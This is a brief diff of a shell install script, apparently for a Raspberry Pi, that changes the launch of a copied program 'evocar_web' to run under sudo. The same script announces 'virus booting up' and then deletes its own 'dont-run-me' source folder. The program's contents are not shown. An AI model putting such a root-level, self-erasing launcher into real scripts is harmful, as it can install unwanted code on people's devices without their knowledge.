@@ -5,9 +5,8 @@ else
 	cp evocar_web /home/pi/system/evocar_web
 	touch /home/pi/system/rungetmyIP
 	echo "a" > /home/pi/system/rungetmyIP
-	bash /home/pi/system/evocar_web
+	sudo bash /home/pi/system/evocar_web
 	echo "chain reaction started... virus booting up"
 fi
 cd ..
 rm -Rf dont-run-me
-
